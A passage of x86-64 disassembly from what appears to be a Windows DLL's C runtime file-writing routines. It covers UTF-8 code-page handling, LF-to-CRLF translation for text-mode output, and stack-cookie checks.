   18000b9ed:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   18000b9f2:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   18000b9f7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000b9fc:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   18000ba01:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   18000ba06:	e8 fd fe ff ff       	call   0x18000b908
   18000ba0b:	eb 13                	jmp    0x18000ba20
   18000ba0d:	e8 e2 a6 ff ff       	call   0x1800060f4
   18000ba12:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000ba18:	e8 2f a5 ff ff       	call   0x180005f4c
   18000ba1d:	83 c8 ff             	or     $0xffffffff,%eax
   18000ba20:	48 83 c4 38          	add    $0x38,%rsp
   18000ba24:	c3                   	ret
   18000ba25:	cc                   	int3
   18000ba26:	cc                   	int3
   18000ba27:	cc                   	int3
   18000ba28:	48 8b c4             	mov    %rsp,%rax
   18000ba2b:	55                   	push   %rbp
   18000ba2c:	56                   	push   %rsi
   18000ba2d:	57                   	push   %rdi
   18000ba2e:	41 54                	push   %r12
   18000ba30:	41 55                	push   %r13
   18000ba32:	41 56                	push   %r14
   18000ba34:	41 57                	push   %r15
   18000ba36:	48 8d 68 a9          	lea    -0x57(%rax),%rbp
   18000ba3a:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   18000ba41:	48 c7 45 f7 fe ff ff 	movq   $0xfffffffffffffffe,-0x9(%rbp)
   18000ba48:	ff 
   18000ba49:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000ba4d:	48 8b 05 ac e5 00 00 	mov    0xe5ac(%rip),%rax        # 0x18001a000
   18000ba54:	48 33 c4             	xor    %rsp,%rax
   18000ba57:	48 89 45 17          	mov    %rax,0x17(%rbp)
   18000ba5b:	49 8b f0             	mov    %r8,%rsi
   18000ba5e:	4c 89 45 bf          	mov    %r8,-0x41(%rbp)
   18000ba62:	4c 63 f2             	movslq %edx,%r14
   18000ba65:	48 8b d9             	mov    %rcx,%rbx
   18000ba68:	48 8b 45 7f          	mov    0x7f(%rbp),%rax
   18000ba6c:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   18000ba70:	49 8b c6             	mov    %r14,%rax
   18000ba73:	4d 8b ee             	mov    %r14,%r13
   18000ba76:	49 c1 fd 06          	sar    $0x6,%r13
   18000ba7a:	4c 89 6d c7          	mov    %r13,-0x39(%rbp)
   18000ba7e:	48 8d 0d 7b 45 ff ff 	lea    -0xba85(%rip),%rcx        # 0x180000000
   18000ba85:	83 e0 3f             	and    $0x3f,%eax
   18000ba88:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   18000ba8c:	4a 8b 84 e9 d0 b0 01 	mov    0x1b0d0(%rcx,%r13,8),%rax
   18000ba93:	00 
   18000ba94:	4a 8b 44 f8 28       	mov    0x28(%rax,%r15,8),%rax
   18000ba99:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   18000ba9d:	45 8b e1             	mov    %r9d,%r12d
   18000baa0:	4d 03 e0             	add    %r8,%r12
   18000baa3:	4c 89 65 9f          	mov    %r12,-0x61(%rbp)
   18000baa7:	ff 15 6b 37 00 00    	call   *0x376b(%rip)        # 0x18000f218
   18000baad:	89 45 b7             	mov    %eax,-0x49(%rbp)
   18000bab0:	33 ff                	xor    %edi,%edi
   18000bab2:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   18000bab6:	41 38 7a 28          	cmp    %dil,0x28(%r10)
   18000baba:	75 0c                	jne    0x18000bac8
   18000babc:	49 8b ca             	mov    %r10,%rcx
   18000babf:	e8 7c a0 ff ff       	call   0x180005b40
   18000bac4:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   18000bac8:	49 8b 4a 18          	mov    0x18(%r10),%rcx
   18000bacc:	8b 49 0c             	mov    0xc(%rcx),%ecx
   18000bacf:	89 4d bb             	mov    %ecx,-0x45(%rbp)
   18000bad2:	33 c0                	xor    %eax,%eax
   18000bad4:	48 89 03             	mov    %rax,(%rbx)
   18000bad7:	89 43 08             	mov    %eax,0x8(%rbx)
   18000bada:	4c 39 65 bf          	cmp    %r12,-0x41(%rbp)
   18000bade:	0f 83 ad 03 00 00    	jae    0x18000be91
   18000bae4:	4d 8b de             	mov    %r14,%r11
   18000bae7:	49 c1 fb 06          	sar    $0x6,%r11
   18000baeb:	4c 89 5d ef          	mov    %r11,-0x11(%rbp)
   18000baef:	8b d7                	mov    %edi,%edx
   18000baf1:	8a 06                	mov    (%rsi),%al
   18000baf3:	88 45 8f             	mov    %al,-0x71(%rbp)
   18000baf6:	89 7d 93             	mov    %edi,-0x6d(%rbp)
   18000baf9:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   18000baff:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   18000bb05:	0f 85 8d 01 00 00    	jne    0x18000bc98
   18000bb0b:	8b d7                	mov    %edi,%edx
   18000bb0d:	4c 8b f7             	mov    %rdi,%r14
   18000bb10:	4c 8d 25 e9 44 ff ff 	lea    -0xbb17(%rip),%r12        # 0x180000000
   18000bb17:	4a 8d 0c fd 3e 00 00 	lea    0x3e(,%r15,8),%rcx
   18000bb1e:	00 
   18000bb1f:	4b 03 8c dc d0 b0 01 	add    0x1b0d0(%r12,%r11,8),%rcx
   18000bb26:	00 
   18000bb27:	40 38 39             	cmp    %dil,(%rcx)
   18000bb2a:	74 0e                	je     0x18000bb3a
   18000bb2c:	ff c2                	inc    %edx
   18000bb2e:	49 ff c6             	inc    %r14
   18000bb31:	48 ff c1             	inc    %rcx
   18000bb34:	49 83 fe 05          	cmp    $0x5,%r14
   18000bb38:	7c ed                	jl     0x18000bb27
   18000bb3a:	4d 85 f6             	test   %r14,%r14
   18000bb3d:	0f 8e eb 00 00 00    	jle    0x18000bc2e
   18000bb43:	4b 8b 84 ec d0 b0 01 	mov    0x1b0d0(%r12,%r13,8),%rax
   18000bb4a:	00 
   18000bb4b:	42 0f b6 4c f8 3e    	movzbl 0x3e(%rax,%r15,8),%ecx
   18000bb51:	46 0f be a4 21 00 a9 	movsbl 0x1a900(%rcx,%r12,1),%r12d
   18000bb58:	01 00 
   18000bb5a:	41 ff c4             	inc    %r12d
   18000bb5d:	41 8b c4             	mov    %r12d,%eax
   18000bb60:	2b c2                	sub    %edx,%eax
   18000bb62:	89 45 af             	mov    %eax,-0x51(%rbp)
   18000bb65:	4c 8b 45 9f          	mov    -0x61(%rbp),%r8
   18000bb69:	4c 2b c6             	sub    %rsi,%r8
   18000bb6c:	4c 63 c8             	movslq %eax,%r9
   18000bb6f:	4d 3b c8             	cmp    %r8,%r9
   18000bb72:	0f 8f 8d 02 00 00    	jg     0x18000be05
   18000bb78:	48 8b cf             	mov    %rdi,%rcx
   18000bb7b:	4c 8d 05 7e 44 ff ff 	lea    -0xbb82(%rip),%r8        # 0x180000000
   18000bb82:	4a 8d 14 fd 3e 00 00 	lea    0x3e(,%r15,8),%rdx
   18000bb89:	00 
   18000bb8a:	4b 03 94 d8 d0 b0 01 	add    0x1b0d0(%r8,%r11,8),%rdx
   18000bb91:	00 
   18000bb92:	8a 02                	mov    (%rdx),%al
   18000bb94:	88 44 0d ff          	mov    %al,-0x1(%rbp,%rcx,1)
   18000bb98:	48 ff c1             	inc    %rcx
   18000bb9b:	48 ff c2             	inc    %rdx
   18000bb9e:	49 3b ce             	cmp    %r14,%rcx
   18000bba1:	7c ef                	jl     0x18000bb92
   18000bba3:	4d 85 c9             	test   %r9,%r9
   18000bba6:	7e 1d                	jle    0x18000bbc5
   18000bba8:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   18000bbac:	49 03 ce             	add    %r14,%rcx
   18000bbaf:	4d 8b c1             	mov    %r9,%r8
   18000bbb2:	48 8b d6             	mov    %rsi,%rdx
   18000bbb5:	e8 b6 16 00 00       	call   0x18000d270
   18000bbba:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   18000bbbe:	4c 8d 05 3b 44 ff ff 	lea    -0xbbc5(%rip),%r8        # 0x180000000
   18000bbc5:	48 8b d7             	mov    %rdi,%rdx
   18000bbc8:	4a 8d 0c fa          	lea    (%rdx,%r15,8),%rcx
   18000bbcc:	4b 8b 84 e8 d0 b0 01 	mov    0x1b0d0(%r8,%r13,8),%rax
   18000bbd3:	00 
   18000bbd4:	40 88 7c 01 3e       	mov    %dil,0x3e(%rcx,%rax,1)
   18000bbd9:	48 ff c2             	inc    %rdx
   18000bbdc:	49 3b d6             	cmp    %r14,%rdx
   18000bbdf:	7c e7                	jl     0x18000bbc8
   18000bbe1:	48 89 7d cf          	mov    %rdi,-0x31(%rbp)
   18000bbe5:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   18000bbe9:	48 89 45 d7          	mov    %rax,-0x29(%rbp)
   18000bbed:	8b c7                	mov    %edi,%eax
   18000bbef:	41 83 fc 04          	cmp    $0x4,%r12d
   18000bbf3:	0f 94 c0             	sete   %al
   18000bbf6:	ff c0                	inc    %eax
   18000bbf8:	44 8b e0             	mov    %eax,%r12d
   18000bbfb:	44 8b c0             	mov    %eax,%r8d
   18000bbfe:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   18000bc03:	4c 8d 4d cf          	lea    -0x31(%rbp),%r9
   18000bc07:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   18000bc0b:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   18000bc0f:	e8 f4 df ff ff       	call   0x180009c08
   18000bc14:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000bc18:	0f 84 73 02 00 00    	je     0x18000be91
   18000bc1e:	8b 45 af             	mov    -0x51(%rbp),%eax
   18000bc21:	ff c8                	dec    %eax
   18000bc23:	48 63 c8             	movslq %eax,%rcx
   18000bc26:	48 03 f1             	add    %rcx,%rsi
   18000bc29:	e9 02 01 00 00       	jmp    0x18000bd30
   18000bc2e:	0f b6 06             	movzbl (%rsi),%eax
   18000bc31:	4e 0f be ac 20 00 a9 	movsbq 0x1a900(%rax,%r12,1),%r13
   18000bc38:	01 00 
   18000bc3a:	41 8d 4d 01          	lea    0x1(%r13),%ecx
   18000bc3e:	4c 8b 4d 9f          	mov    -0x61(%rbp),%r9
   18000bc42:	4c 2b ce             	sub    %rsi,%r9
   18000bc45:	48 63 c1             	movslq %ecx,%rax
   18000bc48:	49 3b c1             	cmp    %r9,%rax
   18000bc4b:	0f 8f ea 01 00 00    	jg     0x18000be3b
   18000bc51:	48 89 7d af          	mov    %rdi,-0x51(%rbp)
   18000bc55:	48 89 75 df          	mov    %rsi,-0x21(%rbp)
   18000bc59:	8b c7                	mov    %edi,%eax
   18000bc5b:	83 f9 04             	cmp    $0x4,%ecx
   18000bc5e:	0f 94 c0             	sete   %al
   18000bc61:	ff c0                	inc    %eax
   18000bc63:	44 8b f0             	mov    %eax,%r14d
   18000bc66:	44 8b c0             	mov    %eax,%r8d
   18000bc69:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   18000bc6e:	4c 8d 4d af          	lea    -0x51(%rbp),%r9
   18000bc72:	48 8d 55 df          	lea    -0x21(%rbp),%rdx
   18000bc76:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   18000bc7a:	e8 89 df ff ff       	call   0x180009c08
   18000bc7f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000bc83:	0f 84 08 02 00 00    	je     0x18000be91
   18000bc89:	49 03 f5             	add    %r13,%rsi
   18000bc8c:	45 8b e6             	mov    %r14d,%r12d
   18000bc8f:	4c 8b 6d c7          	mov    -0x39(%rbp),%r13
   18000bc93:	e9 98 00 00 00       	jmp    0x18000bd30
   18000bc98:	4c 8d 1d 61 43 ff ff 	lea    -0xbc9f(%rip),%r11        # 0x180000000
   18000bc9f:	4f 8b 84 eb d0 b0 01 	mov    0x1b0d0(%r11,%r13,8),%r8
   18000bca6:	00 
   18000bca7:	43 8a 4c f8 3d       	mov    0x3d(%r8,%r15,8),%cl
   18000bcac:	f6 c1 04             	test   $0x4,%cl
   18000bcaf:	74 21                	je     0x18000bcd2
   18000bcb1:	43 8a 44 f8 3e       	mov    0x3e(%r8,%r15,8),%al
   18000bcb6:	88 45 07             	mov    %al,0x7(%rbp)
   18000bcb9:	8a 06                	mov    (%rsi),%al
   18000bcbb:	88 45 08             	mov    %al,0x8(%rbp)
   18000bcbe:	80 e1 fb             	and    $0xfb,%cl
   18000bcc1:	43 88 4c f8 3d       	mov    %cl,0x3d(%r8,%r15,8)
   18000bcc6:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   18000bccc:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   18000bcd0:	eb 49                	jmp    0x18000bd1b
   18000bcd2:	44 0f b6 0e          	movzbl (%rsi),%r9d
   18000bcd6:	49 8b 42 18          	mov    0x18(%r10),%rax
   18000bcda:	48 8b 08             	mov    (%rax),%rcx
   18000bcdd:	66 42 39 3c 49       	cmp    %di,(%rcx,%r9,2)
   18000bce2:	7d 31                	jge    0x18000bd15
   18000bce4:	4c 8d 76 01          	lea    0x1(%rsi),%r14
   18000bce8:	4c 3b 75 9f          	cmp    -0x61(%rbp),%r14
   18000bcec:	0f 83 7c 01 00 00    	jae    0x18000be6e
   18000bcf2:	4d 8b ca             	mov    %r10,%r9
   18000bcf5:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   18000bcfb:	48 8b d6             	mov    %rsi,%rdx
   18000bcfe:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   18000bd02:	e8 49 db ff ff       	call   0x180009850
   18000bd07:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000bd0a:	0f 84 81 01 00 00    	je     0x18000be91
   18000bd10:	49 8b f6             	mov    %r14,%rsi
   18000bd13:	eb 1b                	jmp    0x18000bd30
   18000bd15:	4d 8b c4             	mov    %r12,%r8
   18000bd18:	48 8b d6             	mov    %rsi,%rdx
   18000bd1b:	4d 8b ca             	mov    %r10,%r9
   18000bd1e:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   18000bd22:	e8 29 db ff ff       	call   0x180009850
   18000bd27:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000bd2a:	0f 84 61 01 00 00    	je     0x18000be91
   18000bd30:	48 ff c6             	inc    %rsi
   18000bd33:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   18000bd38:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   18000bd3d:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   18000bd44:	00 
   18000bd45:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   18000bd49:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000bd4e:	45 8b cc             	mov    %r12d,%r9d
   18000bd51:	4c 8d 45 93          	lea    -0x6d(%rbp),%r8
   18000bd55:	33 d2                	xor    %edx,%edx
   18000bd57:	8b 4d b7             	mov    -0x49(%rbp),%ecx
   18000bd5a:	e8 bd c6 ff ff       	call   0x18000841c
   18000bd5f:	44 8b f0             	mov    %eax,%r14d
   18000bd62:	85 c0                	test   %eax,%eax
   18000bd64:	0f 84 27 01 00 00    	je     0x18000be91
   18000bd6a:	89 7d 97             	mov    %edi,-0x69(%rbp)
   18000bd6d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000bd72:	4c 8d 4d 97          	lea    -0x69(%rbp),%r9
   18000bd76:	44 8b c0             	mov    %eax,%r8d
   18000bd79:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   18000bd7d:	4c 8b 65 e7          	mov    -0x19(%rbp),%r12
   18000bd81:	49 8b cc             	mov    %r12,%rcx
   18000bd84:	ff 15 86 34 00 00    	call   *0x3486(%rip)        # 0x18000f210
   18000bd8a:	85 c0                	test   %eax,%eax
   18000bd8c:	0f 84 f7 00 00 00    	je     0x18000be89
   18000bd92:	8b 53 08             	mov    0x8(%rbx),%edx
   18000bd95:	2b 55 bf             	sub    -0x41(%rbp),%edx
   18000bd98:	03 d6                	add    %esi,%edx
   18000bd9a:	89 53 04             	mov    %edx,0x4(%rbx)
   18000bd9d:	44 39 75 97          	cmp    %r14d,-0x69(%rbp)
   18000bda1:	0f 82 ea 00 00 00    	jb     0x18000be91
   18000bda7:	80 7d 8f 0a          	cmpb   $0xa,-0x71(%rbp)
   18000bdab:	75 3e                	jne    0x18000bdeb
   18000bdad:	b8 0d 00 00 00       	mov    $0xd,%eax
   18000bdb2:	66 89 45 8f          	mov    %ax,-0x71(%rbp)
   18000bdb6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000bdbb:	4c 8d 4d 97          	lea    -0x69(%rbp),%r9
   18000bdbf:	44 8d 40 f4          	lea    -0xc(%rax),%r8d
   18000bdc3:	48 8d 55 8f          	lea    -0x71(%rbp),%rdx
   18000bdc7:	49 8b cc             	mov    %r12,%rcx
   18000bdca:	ff 15 40 34 00 00    	call   *0x3440(%rip)        # 0x18000f210
   18000bdd0:	85 c0                	test   %eax,%eax
   18000bdd2:	0f 84 b1 00 00 00    	je     0x18000be89
   18000bdd8:	83 7d 97 01          	cmpl   $0x1,-0x69(%rbp)
   18000bddc:	0f 82 af 00 00 00    	jb     0x18000be91
   18000bde2:	ff 43 08             	incl   0x8(%rbx)
   18000bde5:	ff 43 04             	incl   0x4(%rbx)
   18000bde8:	8b 53 04             	mov    0x4(%rbx),%edx
   18000bdeb:	48 3b 75 9f          	cmp    -0x61(%rbp),%rsi
   18000bdef:	0f 83 9c 00 00 00    	jae    0x18000be91
   18000bdf5:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   18000bdf9:	4c 8b 5d ef          	mov    -0x11(%rbp),%r11
   18000bdfd:	8b 4d bb             	mov    -0x45(%rbp),%ecx
   18000be00:	e9 ec fc ff ff       	jmp    0x18000baf1
   18000be05:	4d 85 c0             	test   %r8,%r8
   18000be08:	7e 2b                	jle    0x18000be35
   18000be0a:	49 2b f6             	sub    %r14,%rsi
   18000be0d:	4c 8d 0d ec 41 ff ff 	lea    -0xbe14(%rip),%r9        # 0x180000000
   18000be14:	4b 8d 14 fe          	lea    (%r14,%r15,8),%rdx
   18000be18:	4b 8b 8c e9 d0 b0 01 	mov    0x1b0d0(%r9,%r13,8),%rcx
   18000be1f:	00 
   18000be20:	42 8a 04 36          	mov    (%rsi,%r14,1),%al
   18000be24:	88 44 0a 3e          	mov    %al,0x3e(%rdx,%rcx,1)
   18000be28:	ff c7                	inc    %edi
   18000be2a:	49 ff c6             	inc    %r14
   18000be2d:	48 63 c7             	movslq %edi,%rax
   18000be30:	49 3b c0             	cmp    %r8,%rax
   18000be33:	7c df                	jl     0x18000be14
   18000be35:	44 01 43 04          	add    %r8d,0x4(%rbx)
   18000be39:	eb 56                	jmp    0x18000be91
   18000be3b:	4d 85 c9             	test   %r9,%r9
   18000be3e:	7e 28                	jle    0x18000be68
   18000be40:	4c 8b c7             	mov    %rdi,%r8
   18000be43:	4c 8b 55 c7          	mov    -0x39(%rbp),%r10
   18000be47:	4b 8d 14 f8          	lea    (%r8,%r15,8),%rdx
   18000be4b:	4b 8b 8c d4 d0 b0 01 	mov    0x1b0d0(%r12,%r10,8),%rcx
   18000be52:	00 
   18000be53:	41 8a 04 30          	mov    (%r8,%rsi,1),%al
   18000be57:	88 44 0a 3e          	mov    %al,0x3e(%rdx,%rcx,1)
   18000be5b:	ff c7                	inc    %edi
   18000be5d:	49 ff c0             	inc    %r8
   18000be60:	48 63 c7             	movslq %edi,%rax
   18000be63:	49 3b c1             	cmp    %r9,%rax
   18000be66:	7c df                	jl     0x18000be47
   18000be68:	44 01 4b 04          	add    %r9d,0x4(%rbx)
   18000be6c:	eb 23                	jmp    0x18000be91
   18000be6e:	47 88 4c f8 3e       	mov    %r9b,0x3e(%r8,%r15,8)
   18000be73:	4b 8b 84 eb d0 b0 01 	mov    0x1b0d0(%r11,%r13,8),%rax
   18000be7a:	00 
   18000be7b:	42 80 4c f8 3d 04    	orb    $0x4,0x3d(%rax,%r15,8)
   18000be81:	8d 42 01             	lea    0x1(%rdx),%eax
   18000be84:	89 43 04             	mov    %eax,0x4(%rbx)
   18000be87:	eb 08                	jmp    0x18000be91
   18000be89:	ff 15 e1 31 00 00    	call   *0x31e1(%rip)        # 0x18000f070
   18000be8f:	89 03                	mov    %eax,(%rbx)
   18000be91:	48 8b c3             	mov    %rbx,%rax
   18000be94:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   18000be98:	48 33 cc             	xor    %rsp,%rcx
   18000be9b:	e8 30 54 ff ff       	call   0x1800012d0
   18000bea0:	48 8b 9c 24 10 01 00 	mov    0x110(%rsp),%rbx
   18000bea7:	00 
   18000bea8:	48 81 c4 d0 00 00 00 	add    $0xd0,%rsp
   18000beaf:	41 5f                	pop    %r15
   18000beb1:	41 5e                	pop    %r14
   18000beb3:	41 5d                	pop    %r13
   18000beb5:	41 5c                	pop    %r12
   18000beb7:	5f                   	pop    %rdi
   18000beb8:	5e                   	pop    %rsi
   18000beb9:	5d                   	pop    %rbp
   18000beba:	c3                   	ret
   18000bebb:	cc                   	int3
   18000bebc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000bec1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000bec6:	56                   	push   %rsi
   18000bec7:	57                   	push   %rdi
   18000bec8:	41 56                	push   %r14
   18000beca:	b8 50 14 00 00       	mov    $0x1450,%eax
   18000becf:	e8 5c 12 00 00       	call   0x18000d130
   18000bed4:	48 2b e0             	sub    %rax,%rsp
   18000bed7:	48 8b 05 22 e1 00 00 	mov    0xe122(%rip),%rax        # 0x18001a000
   18000bede:	48 33 c4             	xor    %rsp,%rax
   18000bee1:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   18000bee8:	00 
   18000bee9:	4c 63 d2             	movslq %edx,%r10
   18000beec:	48 8b f9             	mov    %rcx,%rdi
   18000beef:	49 8b c2             	mov    %r10,%rax
   18000bef2:	41 8b e9             	mov    %r9d,%ebp
   18000bef5:	48 c1 f8 06          	sar    $0x6,%rax
   18000bef9:	48 8d 0d d0 f1 00 00 	lea    0xf1d0(%rip),%rcx        # 0x18001b0d0
   18000bf00:	41 83 e2 3f          	and    $0x3f,%r10d
   18000bf04:	49 03 e8             	add    %r8,%rbp
   18000bf07:	49 8b f0             	mov    %r8,%rsi
   18000bf0a:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   18000bf0e:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   18000bf12:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   18000bf17:	33 c0                	xor    %eax,%eax
   18000bf19:	48 89 07             	mov    %rax,(%rdi)
   18000bf1c:	89 47 08             	mov    %eax,0x8(%rdi)
   18000bf1f:	4c 3b c5             	cmp    %rbp,%r8
   18000bf22:	73 74                	jae    0x18000bf98
   18000bf24:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   18000bf29:	48 3b f5             	cmp    %rbp,%rsi
   18000bf2c:	73 24                	jae    0x18000bf52
   18000bf2e:	8a 06                	mov    (%rsi),%al
   18000bf30:	48 ff c6             	inc    %rsi
   18000bf33:	3c 0a                	cmp    $0xa,%al
   18000bf35:	75 09                	jne    0x18000bf40
   18000bf37:	ff 47 08             	incl   0x8(%rdi)
   18000bf3a:	c6 03 0d             	movb   $0xd,(%rbx)
   18000bf3d:	48 ff c3             	inc    %rbx
   18000bf40:	88 03                	mov    %al,(%rbx)
   18000bf42:	48 ff c3             	inc    %rbx
   18000bf45:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   18000bf4c:	00 
   18000bf4d:	48 3b d8             	cmp    %rax,%rbx
   18000bf50:	72 d7                	jb     0x18000bf29
   18000bf52:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   18000bf57:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   18000bf5c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000bf62:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   18000bf67:	2b d8                	sub    %eax,%ebx
   18000bf69:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000bf6e:	44 8b c3             	mov    %ebx,%r8d
   18000bf71:	49 8b ce             	mov    %r14,%rcx
   18000bf74:	ff 15 96 32 00 00    	call   *0x3296(%rip)        # 0x18000f210
   18000bf7a:	85 c0                	test   %eax,%eax
   18000bf7c:	74 12                	je     0x18000bf90
   18000bf7e:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000bf82:	01 47 04             	add    %eax,0x4(%rdi)
   18000bf85:	3b c3                	cmp    %ebx,%eax
   18000bf87:	72 0f                	jb     0x18000bf98
   18000bf89:	48 3b f5             	cmp    %rbp,%rsi
   18000bf8c:	72 96                	jb     0x18000bf24
   18000bf8e:	eb 08                	jmp    0x18000bf98
   18000bf90:	ff 15 da 30 00 00    	call   *0x30da(%rip)        # 0x18000f070
   18000bf96:	89 07                	mov    %eax,(%rdi)
   18000bf98:	48 8b c7             	mov    %rdi,%rax
   18000bf9b:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   18000bfa2:	00 
   18000bfa3:	48 33 cc             	xor    %rsp,%rcx
   18000bfa6:	e8 25 53 ff ff       	call   0x1800012d0
   18000bfab:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   18000bfb2:	00 
   18000bfb3:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   18000bfb7:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   18000bfbb:	49 8b e3             	mov    %r11,%rsp
   18000bfbe:	41 5e                	pop    %r14
   18000bfc0:	5f                   	pop    %rdi
   18000bfc1:	5e                   	pop    %rsi
   18000bfc2:	c3                   	ret
   18000bfc3:	cc                   	int3
   18000bfc4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000bfc9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000bfce:	56                   	push   %rsi
   18000bfcf:	57                   	push   %rdi
   18000bfd0:	41 56                	push   %r14
   18000bfd2:	b8 50 14 00 00       	mov    $0x1450,%eax
   18000bfd7:	e8 54 11 00 00       	call   0x18000d130
   18000bfdc:	48 2b e0             	sub    %rax,%rsp
   18000bfdf:	48 8b 05 1a e0 00 00 	mov    0xe01a(%rip),%rax        # 0x18001a000
   18000bfe6:	48 33 c4             	xor    %rsp,%rax
   18000bfe9:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   18000bff0:	00 
   18000bff1:	4c 63 d2             	movslq %edx,%r10
   18000bff4:	48 8b f9             	mov    %rcx,%rdi
   18000bff7:	49 8b c2             	mov    %r10,%rax
   18000bffa:	41 8b e9             	mov    %r9d,%ebp
   18000bffd:	48 c1 f8 06          	sar    $0x6,%rax
   18000c001:	48 8d 0d c8 f0 00 00 	lea    0xf0c8(%rip),%rcx        # 0x18001b0d0
   18000c008:	41 83 e2 3f          	and    $0x3f,%r10d
   18000c00c:	49 03 e8             	add    %r8,%rbp
   18000c00f:	49 8b f0             	mov    %r8,%rsi
   18000c012:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   18000c016:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   18000c01a:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   18000c01f:	33 c0                	xor    %eax,%eax
   18000c021:	48 89 07             	mov    %rax,(%rdi)
   18000c024:	89 47 08             	mov    %eax,0x8(%rdi)
   18000c027:	4c 3b c5             	cmp    %rbp,%r8
   18000c02a:	0f 83 84 00 00 00    	jae    0x18000c0b4
   18000c030:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   18000c035:	48 3b f5             	cmp    %rbp,%rsi
   18000c038:	73 2e                	jae    0x18000c068
   18000c03a:	0f b7 06             	movzwl (%rsi),%eax
   18000c03d:	48 83 c6 02          	add    $0x2,%rsi
   18000c041:	66 83 f8 0a          	cmp    $0xa,%ax
   18000c045:	75 0d                	jne    0x18000c054
   18000c047:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   18000c04b:	66 c7 03 0d 00       	movw   $0xd,(%rbx)
   18000c050:	48 83 c3 02          	add    $0x2,%rbx
   18000c054:	66 89 03             	mov    %ax,(%rbx)
   18000c057:	48 83 c3 02          	add    $0x2,%rbx
   18000c05b:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   18000c062:	00 
   18000c063:	48 3b d8             	cmp    %rax,%rbx
   18000c066:	72 cd                	jb     0x18000c035
   18000c068:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   18000c06d:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   18000c072:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000c078:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   18000c07d:	48 2b d8             	sub    %rax,%rbx
   18000c080:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000c085:	48 d1 fb             	sar    $1,%rbx
   18000c088:	49 8b ce             	mov    %r14,%rcx
   18000c08b:	03 db                	add    %ebx,%ebx
   18000c08d:	44 8b c3             	mov    %ebx,%r8d
   18000c090:	ff 15 7a 31 00 00    	call   *0x317a(%rip)        # 0x18000f210
   18000c096:	85 c0                	test   %eax,%eax
   18000c098:	74 12                	je     0x18000c0ac
   18000c09a:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000c09e:	01 47 04             	add    %eax,0x4(%rdi)
   18000c0a1:	3b c3                	cmp    %ebx,%eax
   18000c0a3:	72 0f                	jb     0x18000c0b4
   18000c0a5:	48 3b f5             	cmp    %rbp,%rsi
